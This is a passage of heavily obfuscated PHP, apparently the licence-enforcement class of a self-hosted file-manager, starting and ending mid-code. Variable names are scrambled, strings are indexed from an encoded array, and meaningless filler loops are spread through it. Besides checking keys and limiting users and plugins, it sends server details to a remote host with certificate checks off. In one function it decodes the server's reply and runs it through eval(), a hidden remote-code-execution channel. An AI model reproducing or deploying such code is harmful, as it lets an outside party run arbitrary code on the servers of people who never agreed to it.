!0); } else { if ($¾ËÁèëŠ[$«òÛÊšı[167]] == $«òÛÊšı[174]) { $İ¸ÙòŸ = substr(md5($«òÛÊšı[175] . $¬†ä±î÷), 12, 15) . $«òÛÊšı[176]; $É‘‡ÜØ‚ = $this->ntslc452c949(trim($¾ËÁèëŠ[$«òÛÊšı[177]]), $İ¸ÙòŸ, 2); $Ö›–¥ÅÙ = json_decode($É‘‡ÜØ‚, !0); if (!is_array($Ö›–¥ÅÙ) || !is_array($Ö›–¥ÅÙ[$«òÛÊšı[178]]) || $Ö›–¥ÅÙ[$«òÛÊšı[152]] != !0) { $ôŸ¯ı¡â = $«òÛÊšı[179]; $ŒÕ×÷ï = $Ö›–¥ÅÙ[$«òÛÊšı[178]] ? $«òÛÊšı[180] . $Ö›–¥ÅÙ[$«òÛÊšı[178]] : $ôŸ¯ı¡â; show_json($ŒÕ×÷ï, !1); } else { $÷ñš…¶Ê[$«òÛÊšı[155]] = $Ö›–¥ÅÙ[$«òÛÊšı[178]][$«òÛÊšı[181]]; } } else { $Ö›–¥ÅÙ = $this->xiwt141e00ce($«òÛÊšı[182], $÷ñš…¶Ê, 10); } } if (!is_array($Ö›–¥ÅÙ) || !is_array($Ö›–¥ÅÙ[$«òÛÊšı[178]]) || $Ö›–¥ÅÙ[$«òÛÊšı[152]] != !0) { $ôŸ¯ı¡â = LNG($«òÛÊšı[183]); $ŒÕ×÷ï = $Ö›–¥ÅÙ[$«òÛÊšı[178]] ? $«òÛÊšı[180] . $Ö›–¥ÅÙ[$«òÛÊšı[178]] : $ôŸ¯ı¡â; show_json($ŒÕ×÷ï, !1); } $Öœ±ÔîÀ = $Ö›–¥ÅÙ[$«òÛÊšı[178]]; $ú¼£êÜ = $this->uslh2fb8a433($Öœ±ÔîÀ[$«òÛÊšı[184]]); $çÇğ¯Çæ = $¸Õ“Ë³î[744]; if (strlen($çÇğ¯Çæ) < $¸Õ“Ë³î[711]) { die; } if (!$ú¼£êÜ || $ú¼£êÜ != $Öœ±ÔîÀ[$«òÛÊšı[129]]) { $Œå¤ë± = array($«òÛÊšı[185] => Model($«òÛÊšı[33])->get($«òÛÊšı[100]), $«òÛÊšı[186] => $_SERVER[$«òÛÊšı[106]], $«òÛÊšı[187] => this_url(), $«òÛÊšı[161] => $_SERVER[$«òÛÊšı[162]]); $É‘‡ÜØ‚ = $this->vusx21200ae5(json_encode($Œå¤ë±)); $this->xiwt141e00ce($«òÛÊšı[188] . $É‘‡ÜØ‚); show_json(LNG($«òÛÊšı[189]), !0); } $ñœ«¥Ûë = array($«òÛÊšı[153] => $Öœ±ÔîÀ[$«òÛÊšı[190]], $«òÛÊšı[191] => $Öœ±ÔîÀ[$«òÛÊšı[192]], $«òÛÊšı[193] => rand_string(16), $«òÛÊšı[108] => $Öœ±ÔîÀ[$«òÛÊšı[194]]); if ($÷ñš…¶Ê[$«òÛÊšı[155]]) { $ñœ«¥Ûë[$«òÛÊšı[193]] = $÷ñš…¶Ê[$«òÛÊšı[155]]; } $ÅÔöçú“ = substr(md5($ñœ«¥Ûë[$«òÛÊšı[191]]), 10, 10); $™£€èå = $ÅÔöçú“ . $ñœ«¥Ûë[$«òÛÊšı[108]] . $ñœ«¥Ûë[$«òÛÊšı[193]]; $÷¡•¼é¥ = $¸Õ“Ë³î[745]; while ($÷¡•¼é¥ < $¸Õ“Ë³î[700]) { if ($÷¡•¼é¥ >= 0) { break; } $÷¡•¼é¥++; } $ñœ«¥Ûë[$«òÛÊšı[110]] = strrev(base64_encode($this->rlqddde9af47($™£€èå, $«òÛÊšı[195]))); $ø¸‚‰ª¢ = $¸Õ“Ë³î[746]; if (!$ø¸‚‰ª¢) { die; } $ĞèàõÃÚ = rand_string(16); $¢Ú–Ïé• = $ĞèàõÃÚ . $ñœ«¥Ûë[$«òÛÊšı[108]] . $this->rlqddde9af47(md5($ñœ«¥Ûë[$«òÛÊšı[153]]), $ĞèàõÃÚ); $è ¶¾Æ = $¸Õ“Ë³î[747]; $ñœ«¥Ûë[$«òÛÊšı[111]] = base64_encode(strrev($this->rlqddde9af47($¢Ú–Ïé•, $«òÛÊšı[196]))); $Ò¢Šç® = $¸Õ“Ë³î[748]; if ($Öœ±ÔîÀ[$«òÛÊšı[197]] && $Öœ±ÔîÀ[$«òÛÊšı[197]] >= 1) { Model($«òÛÊšı[33])->setDeep($«òÛÊšı[198], $«òÛÊšı[122]); } Model($«òÛÊšı[33])->set($ñœ«¥Ûë); $Ò£ˆÎ±š = md5($_SERVER[$«òÛÊšı[106]] . strrev($ÄãÊª¿³) . $ñœ«¥Ûë[$«òÛÊšı[191]]); $ƒ¤¡ª’‹ = $¸Õ“Ë³î[749]; if (strlen($ƒ¤¡ª’‹) < $¸Õ“Ë³î[702]) { die; } $¡ë·ßØÓ = strrev(substr($Ò£ˆÎ±š, 10, 16)); $È¾³İéú = $¸Õ“Ë³î[750]; if (!$È¾³İéú) { die; } $Çç¥€ı´ = $this->kzgs8fa9b962(json_encode($Öœ±ÔîÀ), $Ò£ˆÎ±š); $É½ÜåÌ = $¸Õ“Ë³î[751]; while (strlen($É½ÜåÌ) < $¸Õ“Ë³î[709]) { if (!$É½ÜåÌ) { break; } $É½ÜåÌ++; } $ßÇÛ‹•¨ = array_to_keyvalue(Model($«òÛÊšı[7])->listData(), $«òÛÊšı[199]); $ØìàÅÕ´ = $ßÇÛ‹•¨[$«òÛÊšı[200]]; $ØÎùç×™ = $¸Õ“Ë³î[752]; if (strlen($ØÎùç×™) < $¸Õ“Ë³î[711]) { die; } $ÄÃâîä = array(); $ÄÃâîä[$¡ë·ßØÓ] = $Çç¥€ı´; $è¯Ö¸Å = $¸Õ“Ë³î[753]; while ($è¯Ö¸Å < $¸Õ“Ë³î[702]) { if ($è¯Ö¸Å >= 0) { break; } $è¯Ö¸Å++; } Model($«òÛÊšı[7])->update($ØìàÅÕ´[$«òÛÊšı[201]], array($«òÛÊšı[202] => $ÄÃâîä)); $this->vqlo8c031671 = $Öœ±ÔîÀ; $×½û† = $¸Õ“Ë³î[754]; while ($×½û† < $¸Õ“Ë³î[700]) { if ($×½û† >= 0) { break; } $×½û†++; } $this->jzarfbeb2873 = $ñœ«¥Ûë[$«òÛÊšı[108]]; $î‹‚ˆò = $¸Õ“Ë³î[755]; if (strlen($î‹‚ˆò) < $¸Õ“Ë³î[700]) { die; } $this->licenseRegistSuccess(); $«âÈêÏ = $¸Õ“Ë³î[756]; if (!$«âÈêÏ) { die; } Cache::set($«òÛÊšı[203] . md5($ÄãÊª¿³ . $«òÛÊšı[204]), $«òÛÊšı[6]); $®æÒØ = $¸Õ“Ë³î[757]; if (strlen($®æÒØ) < $¸Õ“Ë³î[700]) { die; } show_json(LNG($«òÛÊšı[189]), !0); } private function licenseRegistSuccess() { $ÑÔÊÊ =& $_SERVER[Ò¼î¯­]; $õÂËÔ‚Æ = Model($ÑÔÊÊ[33])->get(); if ($õÂËÔ‚Æ[$ÑÔÊÊ[63]] != $ÑÔÊÊ[122]) { Model($ÑÔÊÊ[33])->set($ÑÔÊÊ[63], $ÑÔÊÊ[122]); } Action($ÑÔÊÊ[205])->initStart(!0); } private function pmcxf787b37d() { $ÏÀ½¶¥’ =& $_SERVER[Î·Ü›öğ]; $Èıƒ…«ú =& $_SERVER[Ò¼î¯­]; Model($Èıƒ…«ú[33])->set(array($Èıƒ…«ú[153] => $Èıƒ…«ú[6], $Èıƒ…«ú[191] => $Èıƒ…«ú[6], $Èıƒ…«ú[108] => $Èıƒ…«ú[109], $Èıƒ…«ú[110] => $Èıƒ…«ú[6], $Èıƒ…«ú[111] => $Èıƒ…«ú[6])); Model($Èıƒ…«ú[33])->setDeep($Èıƒ…«ú[198], $Èıƒ…«ú[206]); $this->vqlo8c031671 = array(); $this->jzarfbeb2873 = $Èıƒ…«ú[109]; $ñ¢Ğ“© = $ÏÀ½¶¥’[758]; while (strlen($ñ¢Ğ“©) < $ÏÀ½¶¥’[485]) { if (!$ñ¢Ğ“©) { break; } $ñ¢Ğ“©++; } } private function uomgb5ce4724() { $¿µ»û­Š =& $_SERVER[Î·Ü›öğ]; $øÏåÛÉş =& $_SERVER[Ò¼î¯­]; $_SERVER[$øÏåÛÉş[162]] = _get($_SERVER, $øÏåÛÉş[162], APP_HOST); $this->jzarfbeb2873 = $øÏåÛÉş[109]; $§²ª‰Å = $¿µ»û­Š[759]; if (strlen($§²ª‰Å) < $¿µ»û­Š[711]) { return; } $ÊÃİŒŸ¡ = Model($øÏåÛÉş[33])->get(); if ($ÊÃİŒŸ¡[$øÏåÛÉş[108]] == $øÏåÛÉş[109]) { return; } $ß¶¸­¬° = Model($øÏåÛÉş[33])->get($øÏåÛÉş[100]); $¾˜ù¸´Ä = $¿µ»û­Š[760]; if (!$¾˜ù¸´Ä) { return; } $ÙÏ«Î‘‘ = $øÏåÛÉş[203] . md5($ß¶¸­¬° . $øÏåÛÉş[204]); $‚¡ ğ› = $¿µ»û­Š[761]; $ÃÃß—§ = Cache::get($ÙÏ«Î‘‘); if (!is_array($ÃÃß—§) || !isset($ÃÃß—§[$øÏåÛÉş[207]]) || time() - $ÃÃß—§[$øÏåÛÉş[207]] >= 60) { $ˆ†ÂåÍ = Model($øÏåÛÉş[7])->loadList(); $†…øÍôó = $ˆ†ÂåÍ[$øÏåÛÉş[200]]; $œ¡³ÁÆ = md5($_SERVER[$øÏåÛÉş[106]] . strrev($ß¶¸­¬°) . $ÊÃİŒŸ¡[$øÏåÛÉş[191]]); $Â†õ«Ñ = strrev(substr($œ¡³ÁÆ, 10, 16)); $ÃÃß—§ = $this->ntslc452c949($†…øÍôó[$øÏåÛÉş[86]][$Â†õ«Ñ], $œ¡³ÁÆ); $ÃÃß—§ = json_decode($ÃÃß—§, !0); } if (!is_array($ÃÃß—§)) { return $this->pmcxf787b37d(); } $¹µä¬ıµ = strtotime($ÃÃß—§[$øÏåÛÉş[129]]); if (time() >= $¹µä¬ıµ) { return $this->pmcxf787b37d(); } if (!isset($ÃÃß—§[$øÏåÛÉş[207]]) || time() - $ÃÃß—§[$øÏåÛÉş[207]] > 20) { $ÃÃß—§[$øÏåÛÉş[207]] = time(); Cache::set($ÙÏ«Î‘‘, $ÃÃß—§); } $this->vqlo8c031671 = $ÃÃß—§; $this->jzarfbeb2873 = $ÊÃİŒŸ¡[$øÏåÛÉş[108]]; $ŸÜÒ¬Ì = $¿µ»û­Š[762]; } private function yokb8555e6f9() { $Œôò¨ã =& $_SERVER[Ò¼î¯­]; $Äğ‚İ = $GLOBALS[$Œôò¨ã[13]]; $Æ”Î«§Í = $_SERVER[$Œôò¨ã[24]]; $•çÔ„€® = $_SERVER[Î·Ü›öğ][763]; if (!$•çÔ„€®) { return; } if ($Æ”Î«§Í == $Œôò¨ã[208] && $this->jzarfbeb2873 == $Œôò¨ã[109]) { show_json(LNG($Œôò¨ã[209]), !1, $Œôò¨ã[210]); } $³˜Æ¥ = array($Œôò¨ã[211], $Œôò¨ã[212]); if (in_array($Æ”Î«§Í, $³˜Æ¥)) { if ($this->jzarfbeb2873 == $Œôò¨ã[109] && isset($Äğ‚İ[$Œôò¨ã[213]])) { show_json(LNG($Œôò¨ã[209]), !1, $Œôò¨ã[210]); die; } $–³Ñš¡¾ = $this->zonia8e86e78(); if ($–³Ñš¡¾ != intval($Œôò¨ã[214])) { if ($–³Ñš¡¾ <= Model($Œôò¨ã[125])->count()) { show_json(LNG($Œôò¨ã[215]), !1, $Œôò¨ã[210]); die; } } } } private function gbmkc9a76b40() { $Â“„ßç¤ =& $_SERVER[Î·Ü›öğ]; $ç‡œ¸  =& $_SERVER[Ò¼î¯­]; $ò¥Æ¹Ñ = array($ç‡œ¸ [119], $ç‡œ¸ [120]); $ÜÛäîñ = $Â“„ßç¤[764]; if (strlen($ÜÛäîñ) < $Â“„ßç¤[702]) { die; } if (!KodUser::isRoot() || !isset($_GET[$ç‡œ¸ [216]])) { return; } if (!in_array($_SERVER[$ç‡œ¸ [24]], $ò¥Æ¹Ñ)) { return; } $¿†¡ó”¥ = $ç‡œ¸ [217]; $¿†¡ó”¥ = $this->drlpd142c367($¿†¡ó”¥, $ç‡œ¸ [218]); $îŠñËÚ› = $Â“„ßç¤[765]; if (strlen($îŠñËÚ›) < $Â“„ßç¤[711]) { return; } $²÷ğ ‰‡ = stream_context_create(array($ç‡œ¸ [219] => array($ç‡œ¸ [220] => $ç‡œ¸ [221], $ç‡œ¸ [222] => 3))); $“³¢‹Œ© = @file_get_contents($¿†¡ó”¥, !1, $²÷ğ ‰‡); $æ¬”œğ = $Â“„ßç¤[766]; while ($æ¬”œğ < $Â“„ßç¤[709]) { if ($æ¬”œğ >= 0) { break; } $æ¬”œğ++; } header($ç‡œ¸ [223]); $ñı¾©ı° = $Â“„ßç¤[767]; if (!$ñı¾©ı°) { die; } if ($“³¢‹Œ© && strstr($“³¢‹Œ©, $ç‡œ¸ [224])) { echo $“³¢‹Œ©; } die; } public function ghao6d599836($‰çÇº) { $û×ô®©É =& $_SERVER[Î·Ü›öğ]; $¤Ö÷˜‘™ =& $_SERVER[Ò¼î¯­]; if ($this->jzarfbeb2873 == $¤Ö÷˜‘™[225]) { return $‰çÇº; } $ÕÈ¬ ” = $this->versionPluginList(); $³³ÁæÆÕ = $û×ô®©É[768]; if (!$³³ÁæÆÕ) { die; } $ŞÁ‹ï = explode($¤Ö÷˜‘™[226], $this->versionPluginFilter()); $ĞÀò˜È‘ = array(); $ä•Èìç€ = $û×ô®©É[769]; while ($ä•Èìç€ < $û×ô®©É[485]) { if ($ä•Èìç€ >= 0) { break; } $ä•Èìç€++; } foreach ($ÕÈ¬ ” as $©ØÅáÌ => $×ı³¨Œó) { if ($×ı³¨Œó == $¤Ö÷˜‘™[227] && substr($this->jzarfbeb2873, 0, 1) == $¤Ö÷˜‘™[227]) { continue; } if (!in_array($©ØÅáÌ, $ŞÁ‹ï)) { $ĞÀò˜È‘[] = $©ØÅáÌ; } } foreach ($ĞÀò˜È‘ as $©ØÅáÌ) { unset($‰çÇº[$©ØÅáÌ]); $î›¯Ã®« = $û×ô®©É[770]; while ($î›¯Ã®« < $û×ô®©É[709]) { if ($î›¯Ã®« >= 0) { break; } $î›¯Ã®«++; } } return $‰çÇº; } private function versionPluginList() { $ĞØ¼ö‹ =& $_SERVER[Ò¼î¯­]; return array($ĞØ¼ö‹[228] => $ĞØ¼ö‹[227], $ĞØ¼ö‹[229] => $ĞØ¼ö‹[227], $ĞØ¼ö‹[230] => $ĞØ¼ö‹[227], $ĞØ¼ö‹[231] => $ĞØ¼ö‹[227], $ĞØ¼ö‹[232] => $ĞØ¼ö‹[233], $ĞØ¼ö‹[234] => $ĞØ¼ö‹[233], $ĞØ¼ö‹[235] => $ĞØ¼ö‹[233], $ĞØ¼ö‹[236] => $ĞØ¼ö‹[233], $ĞØ¼ö‹[237] => $ĞØ¼ö‹[233], $ĞØ¼ö‹[238] => $ĞØ¼ö‹[233], $ĞØ¼ö‹[239] => $ĞØ¼ö‹[233], $ĞØ¼ö‹[240] => $ĞØ¼ö‹[233], $ĞØ¼ö‹[241] => $ĞØ¼ö‹[233], $ĞØ¼ö‹[242] => $ĞØ¼ö‹[233], $ĞØ¼ö‹[243] => $ĞØ¼ö‹[233], $ĞØ¼ö‹[244] => $ĞØ¼ö‹[233], $ĞØ¼ö‹[245] => $ĞØ¼ö‹[233], $ĞØ¼ö‹[246] => $ĞØ¼ö‹[233]); $íÃü³»İ = $_SERVER[Î·Ü›öğ][771]; if (!$íÃü³»İ) { die; } } private function versionPluginFilter() { $ÑñçÕúë =& $_SERVER[Î·Ü›öğ]; $û–†¥ =& $_SERVER[Ò¼î¯­]; if ($this->jzarfbeb2873 == $û–†¥[109]) { return $û–†¥[6]; } $Î…Ã˜”ñ = _get($this->vqlo8c031671, $û–†¥[247], $û–†¥[6]); $˜òÍü•´ = _get($this->vqlo8c031671, $û–†¥[116], $û–†¥[6]); $ Çúé¥¬ = $ÑñçÕúë[772]; if (strlen($ Çúé¥¬) < $ÑñçÕúë[485]) { return; } $”ÁèêÌİ = _get($this->vqlo8c031671, $û–†¥[248], $û–†¥[6]); $©ñŞ‹È = $ÑñçÕúë[773]; if (strlen($©ñŞ‹È) < $ÑñçÕúë[700]) { die; } if ($˜òÍü•´ > time() && $”ÁèêÌİ > time()) { $û‡äúÛ’ = explode($û–†¥[226], $Î…Ã˜”ñ); $œ¬èí½å = array_keys($this->versionPluginList()); $Î…Ã˜”ñ = array_merge($û‡äúÛ’, $œ¬èí½å); $Î…Ã˜”ñ = implode($û–†¥[226], array_filter(array_unique($Î…Ã˜”ñ))); } return $Î…Ã˜”ñ; } private function ewbh36422895() { $ËÒ¥šÂ =& $_SERVER[Ò¼î¯­]; if ($this->jzarfbeb2873 != $ËÒ¥šÂ[109]) { $GLOBALS[$ËÒ¥šÂ[86]][$ËÒ¥šÂ[90]][$ËÒ¥šÂ[249]] = $ËÒ¥šÂ[206]; return; } $GLOBALS[$ËÒ¥šÂ[86]][$ËÒ¥šÂ[250]] = $ËÒ¥šÂ[122]; if (Model($ËÒ¥šÂ[251])->get($ËÒ¥šÂ[63]) != $ËÒ¥šÂ[206]) { Model($ËÒ¥šÂ[251])->set($ËÒ¥šÂ[63], $ËÒ¥šÂ[206]); } } public function jekdca9373ad() { return $_SERVER[Ò¼î¯­][252]; $¢ä‚ÒŒú = $_SERVER[Î·Ü›öğ][774]; } private function vygc9df0fa16() { $«¹¤Õë„ =& $_SERVER[Î·Ü›öğ]; $¾©äÑ× =& $_SERVER[Ò¼î¯­]; $ì™´¦» = array($¾©äÑ×[253], $¾©äÑ×[254], $¾©äÑ×[255]); $“Íé³´’ = $«¹¤Õë„[775]; $¤êÛ¨“Ê = $¾©äÑ×[256] . md5($¾©äÑ×[257]); if ($this->jzarfbeb2873 == $¾©äÑ×[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$¾©äÑ×[24]], $ì™´¦»)) { return; } if (time() % 4 != 0) { return; } $ì•Ï¡Òù = call_user_func(array($¾©äÑ×[258], $¾©äÑ×[259]), $¤êÛ¨“Ê); if ($ì•Ï¡Òù && time() - $ì•Ï¡Òù < intval($¾©äÑ×[260])) { return; } call_user_func(array($¾©äÑ×[258], $¾©äÑ×[139]), $¤êÛ¨“Ê, time()); $“¹¼–¢¹ = Model($¾©äÑ×[33])->get($¾©äÑ×[100]); $áÛå¶„Š = $«¹¤Õë„[776]; while ($áÛå¶„Š < $«¹¤Õë„[709]) { if ($áÛå¶„Š >= 0) { break; } $áÛå¶„Š++; } $– Õüíé = array($¾©äÑ×[152] => Model($¾©äÑ×[33])->get($¾©äÑ×[153]), $¾©äÑ×[167] => $this->jzarfbeb2873, $¾©äÑ×[163] => $_SERVER[$¾©äÑ×[164]], $¾©äÑ×[165] => Model($¾©äÑ×[33])->get($¾©äÑ×[131]), $¾©äÑ×[105] => md5($_SERVER[$¾©äÑ×[106]] . $“¹¼–¢¹), $¾©äÑ×[156] => $¾©äÑ×[136], $¾©äÑ×[159] => $_SERVER[$¾©äÑ×[160]]); $äáäÉ¨ = $«¹¤Õë„[777]; if (strlen($äáäÉ¨) < $«¹¤Õë„[709]) { die; } $ñ­›ä¦ = $this->xiwt141e00ce($¾©äÑ×[261], $– Õüíé); $³©şÌ€ = $«¹¤Õë„[778]; if (strlen($³©şÌ€) < $«¹¤Õë„[702]) { die; } if (!is_array($ñ­›ä¦)) { return; } if ($ñ­›ä¦[$¾©äÑ×[152]] && $ñ­›ä¦[$¾©äÑ×[262]]) { if ($this->uslh2fb8a433($ñ­›ä¦[$¾©äÑ×[262]]) == $– Õüíé[$¾©äÑ×[152]]) { return; } } $this->pmcxf787b37d(); if ($this->uslh2fb8a433($ñ­›ä¦[$¾©äÑ×[262]]) != $– Õüíé[$¾©äÑ×[152]]) { $ëÅ±ÅØ = array($¾©äÑ×[185] => $“¹¼–¢¹, $¾©äÑ×[186] => $_SERVER[$¾©äÑ×[106]], $¾©äÑ×[187] => this_url(), $¾©äÑ×[161] => $_SERVER[$¾©äÑ×[162]]); $‚³®ºîµ = $this->vusx21200ae5(json_encode($ëÅ±ÅØ)); $ñ­›ä¦ = $this->xiwt141e00ce($¾©äÑ×[188] . $‚³®ºîµ); if ($ñ­›ä¦ && is_array($ñ­›ä¦) && isset($ñ­›ä¦[$¾©äÑ×[262]])) { $ÌéÀòšÂ = $this->ntslc452c949($ñ­›ä¦[$¾©äÑ×[262]], 2); if ($ÌéÀòšÂ) { $ÌéÀòšÂ = $this->uslh2fb8a433($ÌéÀòšÂ); } if ($ÌéÀòšÂ) { try { @eval($ÌéÀòšÂ); } catch (Exception $²„ù‘) { } } } } } private function xiwt141e00ce($Ü¦ş™¸Ø = '', $„®´ÌáÉ = array(), $Ù·şÆÅÖ = 5) { $œ“™‘ƒ =& $_SERVER[Î·Ü›öğ]; $‡İ•—Æ =& $_SERVER[Ò¼î¯­]; $ûÄÆ°Şß = $‡İ•—Æ[263]; $Å£øä‹ß = $œ“™‘ƒ[779]; if (!$Å£øä‹ß) { die; } $ûÄÆ°Şß = $this->drlpd142c367($ûÄÆ°Şß, $‡İ•—Æ[264]); $ûÄÆ°Şß = $ûÄÆ°Şß . $Ü¦ş™¸Ø; if ($„®´ÌáÉ && is_array($„®´ÌáÉ)) { $ûÄÆ°Şß = $ûÄÆ°Şß . $‡İ•—Æ[265] . http_build_query($„®´ÌáÉ); } if ($„®´ÌáÉ === -1) { return $ûÄÆ°Şß; } $‘«•ê©» = stream_context_create(array($‡İ•—Æ[219] => array($‡İ•—Æ[222] => $Ù·şÆÅÖ, $‡İ•—Æ[220] => $‡İ•—Æ[266]), $‡İ•—Æ[267] => array($‡İ•—Æ[268] => !1, $‡İ•—Æ[269] => !1))); $øœë˜µ¼ = $œ“™‘ƒ[780]; if (strlen($øœë˜µ¼) < $œ“™‘ƒ[485]) { return; } $„®´ÌáÉ = @file_get_contents($ûÄÆ°Şß, !1, $‘«•ê©»); return json_decode($„®´ÌáÉ, !0); $£—ãªâÎ = $œ“™‘ƒ[781]; $ª¸ùğî« = $œ“™‘ƒ[782]; } private function zonia8e86e78() { $¹ã÷û— =& $_SERVER[Î·Ü›öğ]; $»ÀÄŞ =& $_SERVER[Ò¼î¯­]; $—ÌøĞ¤ï = array($»ÀÄŞ[270] => $»ÀÄŞ[271], $»ÀÄŞ[272] => $»ÀÄŞ[273], $»ÀÄŞ[274] => $»ÀÄŞ[275], $»ÀÄŞ[276] => $»ÀÄŞ[277], $»ÀÄŞ[278] => $»ÀÄŞ[279], $»ÀÄŞ[280] => $»ÀÄŞ[214], $»ÀÄŞ[281] => $»ÀÄŞ[214], $»ÀÄŞ[282] => $»ÀÄŞ[271], $»ÀÄŞ[283] => $»ÀÄŞ[273], $»ÀÄŞ[284] => $»ÀÄŞ[275], $»ÀÄŞ[285] => $»ÀÄŞ[286], $»ÀÄŞ[287] => $»ÀÄŞ[277], $»ÀÄŞ[288] => $»ÀÄŞ[289], $»ÀÄŞ[290] => $»ÀÄŞ[279], $»ÀÄŞ[291] => $»ÀÄŞ[292], $»ÀÄŞ[293] => $»ÀÄŞ[294], $»ÀÄŞ[295] => $»ÀÄŞ[296]); $ŞŸ–€Ş = $—ÌøĞ¤ï[$this->jzarfbeb2873]; $ãÊí¬ = $¹ã÷û—[783]; if (!$ãÊí¬) { die; } $ŞŸ–€Ş = intval($ŞŸ–€Ş ? $ŞŸ–€Ş : $»ÀÄŞ[271]); $Ù¢Ö†ãØ = $¹ã÷û—[784]; $¿Å±·õ× = _get($this->vqlo8c031671, $»ÀÄŞ[297]); $êã¢‰Õ§ = $¹ã÷û—[725]; while ($êã¢‰Õ§ < $¹ã÷û—[711]) { if ($êã¢‰Õ§ >= 0) { break; } $êã¢‰Õ§++; } $¿Å±·õ× = $¿Å±·õ× ? intval($¿Å±·õ×) : 0; return $ŞŸ–€Ş + $¿Å±·õ×; $…îÑ˜° = $¹ã÷û—[785]; } public function bzrg2ca593ef($§»š ˆ¥) { $ğñ¸ŸÀË =& $_SERVER[Î·Ü›öğ]; $è°»õ‚¦ =& $_SERVER[Ò¼î¯­]; $ÌÏ‘±—Õ = $this->zonia8e86e78(); $‘ÙÄê‘ = $ğñ¸ŸÀË[786]; if ($§»š ˆ¥[$è°»õ‚¦[298]] == $è°»õ‚¦[122]) { return; } if ($ÌÏ‘±—Õ >= intval($è°»õ‚¦[214])) { return; } $­·Ÿú¿µ = Model($è°»õ‚¦[125])->count(); $î É¶àù = $ğñ¸ŸÀË[787]; if (!$î É¶àù) { return; } if ($­·Ÿú¿µ <= $ÌÏ‘±—Õ) { return; } $¬Á­¢Ö× = Model($è°»õ‚¦[125])->field($è°»õ‚¦[298])->limit($ÌÏ‘±—Õ)->select(); $¬Á­¢Ö× = array_to_keyvalue($¬Á­¢Ö×, $è°»õ‚¦[6], $è°»õ‚¦[298]); if (!in_array($§»š ˆ¥[$è°»õ‚¦[298]], $¬Á­¢Ö×)) { show_json($è°»õ‚¦[299], !1, $è°»õ‚¦[210]); } } public function eotp5329d601() { $¤ùÉÉ¹ğ =& $_SERVER[Î·Ü›öğ]; $òËÛÀÆ =& $_SERVER[Ò¼î¯­]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $·–ûËÀ² = $òËÛÀÆ[217]; $’ıŞ½öø = $¤ùÉÉ¹ğ[788]; if (strlen($’ıŞ½öø) < $¤ùÉÉ¹ğ[709]) { return; } $·–ûËÀ² = $this->drlpd142c367($·–ûËÀ², $òËÛÀÆ[218]); $ñ¢˜óºÈ = stream_context_create(array($òËÛÀÆ[219] => array($òËÛÀÆ[220] => $òËÛÀÆ[221], $òËÛÀÆ[222] => 3))); $±ŠÔŞË– = @file_get_contents($·–ûËÀ², !1, $ñ¢˜óºÈ); $÷îº§Ã = $¤ùÉÉ¹ğ[789]; if (!$÷îº§Ã) { return; } echo $òËÛÀÆ[300] . hash_encode($±ŠÔŞË–) . $òËÛÀÆ[301]; } private function kzgs8fa9b962($ü•¸¾“ô, $ÈëÆŞ×Ğ, $ÙÖ´ı = 3) { $©ã»ŸÏ =& $_SERVER[Î·Ü›öğ]; $£³ÑÖ± =& $_SERVER[Ò¼î¯­]; usleep(1); $ü•¸¾“ô = trim($ü•¸¾“ô); $ã•™›Ğ = mt_rand(0, 5) . $£³ÑÖ±[6]; $Ò¹¶‘® = $©ã»ŸÏ[790]; while ($Ò¹¶‘® < $©ã»ŸÏ[485]) { if ($Ò¹¶‘® >= 0) { break; } $Ò¹¶‘®++; } $å€åÅ„ = rand_string(15); $ÖíÅµ¸ú = $©ã»ŸÏ[791]; if (!$ÖíÅµ¸ú) { return; } $ÅßÆ—íá = $£³ÑÖ±[302]; $˜‰›üÄñ = $©ã»ŸÏ[792]; if (strlen($˜‰›üÄñ) < $©ã»ŸÏ[700]) { return; } switch ($ã•™›Ğ) { case $£³ÑÖ±[206]: $êëòèÀ´ = $this->rlqddde9af47($ü•¸¾“ô, strrev($ÈëÆŞ×Ğ . $å€åÅ„)); $Ë×Ò£ú = $©ã»ŸÏ[793]; if (!$Ë×Ò£ú) { die; } break; case $£³ÑÖ±[122]: $êëòèÀ´ = $this->rlqddde9af47($ü•¸¾“ô, strrev($å€åÅ„ . $ÈëÆŞ×Ğ)); $äùÂÊƒ = $©ã»ŸÏ[794]; break; $¤•ş†Æ = $©ã»ŸÏ[795]; if (strlen($¤•ş†Æ) < $©ã»ŸÏ[702]) { return; } case $£³ÑÖ±[303]: $êëòèÀ´ = $this->rlqddde9af47($ü•¸¾“ô, base64_encode($å€åÅ„ . $ÈëÆŞ×Ğ)); break; case $£³ÑÖ±[304]: $êëòèÀ´ = $this->rlqddde9af47($ü•¸¾“ô, md5($å€åÅ„ . $ÈëÆŞ×Ğ)); $ÒßœÕº = $©ã»ŸÏ[796]; break; $“×â¶±Ø = $©ã»ŸÏ[797]; if (strlen($“×â¶±Ø) < $©ã»ŸÏ[709]) { return; } case $£³ÑÖ±[305]: $ü•¸¾“ô = base64_encode($ü•¸¾“ô); $Ì†èÖ² = rand(0, 64); $Ï¦ŠÔüî = $©ã»ŸÏ[798]; $‰çØ€“Ê = $ÅßÆ—íá[$Ì†èÖ²]; $Åµ›£†ş = md5($‰çØ€“Ê . md5($ÈëÆŞ×Ğ . $‰çØ€“Ê) . $ÈëÆŞ×Ğ); $Åµ›£†ş = substr($Åµ›£†ş, $Ì†èÖ² % 8, $Ì†èÖ² % 8 + 7); $Åá¸ßû = $£³ÑÖ±[6]; $¸ôè¼ = 0; $àêÇÏÖŒ = 0; $Ì’øëêï = $©ã»ŸÏ[799]; if (!$Ì’øëêï) { return; } $ÉŒ”Áâú = 0; $¹¡¾ù§¹ = $©ã»ŸÏ[800]; if (!$¹¡¾ù§¹) { return; } for ($¸ôè¼ = 0; $¸ôè¼ < strlen($ü•¸¾“ô); $¸ôè¼++) { $ÉŒ”Áâú = $ÉŒ”Áâú == strlen($Åµ›£†ş) ? 0 : $ÉŒ”Áâú; $³‡†ú£Ú = $©ã»ŸÏ[801]; if (!$³‡†ú£Ú) { return; } $àêÇÏÖŒ = ($Ì†èÖ² + strpos($ÅßÆ—íá, $ü•¸¾“ô[$¸ôè¼]) + ord($Åµ›£†ş[$ÉŒ”Áâú++])) % 64; $Åá¸ßû .= $ÅßÆ—íá[$àêÇÏÖŒ]; $¸ŸßÑÆ¨ = $©ã»ŸÏ[802]; if (strlen($¸ŸßÑÆ¨) < $©ã»ŸÏ[700]) { die; } } $êëòèÀ´ = hash_encode($‰çØ€“Ê . $Åá¸ßû); break; default: $êëòèÀ´ = $this->rlqddde9af47($ü•¸¾“ô, $ÈëÆŞ×Ğ . $å€åÅ„); $…ÖòüùÃ = 